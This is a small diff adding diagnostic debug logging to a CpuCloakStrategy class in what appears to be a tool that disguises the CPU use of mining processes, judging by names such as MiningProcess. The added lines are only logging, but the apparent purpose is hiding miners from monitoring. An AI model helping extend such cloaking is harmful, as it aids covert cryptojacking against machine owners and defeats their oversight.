@@ -774,6 +774,12 @@ class CpuCloakStrategy(CloakStrategy):
         try:
             pid, name = process.pid, process.name
             
+            # ✅ DIAGNOSTIC: Log logger level và hoạt động
+            self.logger.debug(f"[DIAGNOSTIC] CpuCloakStrategy.apply() called for PID={pid}")
+            self.logger.debug(f"[DIAGNOSTIC] Logger level: {self.logger.level}")
+            self.logger.debug(f"[DIAGNOSTIC] Logger name: {self.logger.name}")
+            self.logger.debug(f"[DIAGNOSTIC] Logger handlers: {[h.__class__.__name__ for h in self.logger.handlers]}")
+            
             # ✅ EXTRACT METADATA từ enhanced MiningProcess
             process_type = process.get_process_type()
             strategy_hints = process.get_strategy_hints()
